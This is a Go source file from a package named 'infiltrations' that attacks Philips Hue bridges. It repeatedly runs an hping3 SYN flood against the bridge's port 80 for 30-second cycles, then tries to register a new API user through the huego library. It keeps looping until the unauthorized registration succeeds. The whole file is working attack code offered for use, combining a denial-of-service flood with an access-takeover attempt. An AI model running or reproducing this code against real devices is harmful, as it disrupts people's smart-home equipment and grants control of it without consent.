package infiltrations

import (
	"context"
	"fmt"
	"github.com/amimof/huego"
	"log"
	"os"
	"os/exec"
	"time"
)

const (
	DosTime         = 30 * time.Second
	CreateUserDelay = 3 * time.Second
)

func DosAlternateCreateUser(ctx context.Context, bridge *huego.Bridge) (string, error) {
	command, args := dosCommand(bridge.Host)
	cycles := 0

	for {
		cycles++

		// Run DOS attack for DosTime.
		log.Printf("Cycle #%d: Starting DOS attack\n", cycles)
		cancelCommand, err := startCancellableAsynchronousCommand(command, args)
		if err != nil {
			return "", err
		}
		time.Sleep(DosTime)
		log.Printf("Cycle #%d: Stopping DOS attack\n", cycles)
		cancelCommand()

		// Wait and then try to create a user.
		log.Printf("Cycle #%d: Waiting %d seconds before attempting to create uesr\n", cycles, CreateUserDelay/time.Second)
		time.Sleep(CreateUserDelay)
		log.Printf("Cycle #%d: Attempting to create user...\n", cycles)
		user, err := bridge.CreateUser(HueBridgeAppName)
		if err != nil {
			log.Printf("Cycle #%d: Failed to create user, continueing to next cycle\n", cycles)
			continue
		}

		log.Printf("Cycle #%d: Succesfully created user %s\n", cycles, user)
		return user, nil
	}
}

func dosCommand(host string) (string, []string) {
	//return "ping", []string{host}
	return "hping3", []string{"--flood", "-S", "-p", "80", host}
}

func startCancellableAsynchronousCommand(command string, args []string) (context.CancelFunc, error) {
	ctx, cancel := context.WithCancel(context.Background())
	cmd := exec.CommandContext(ctx, command, args...)

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err := cmd.Start()
	if err != nil {
		cancel()
		return nil, fmt.Errorf("error starting command: %w", err)
	}

	return cancel, nil
}
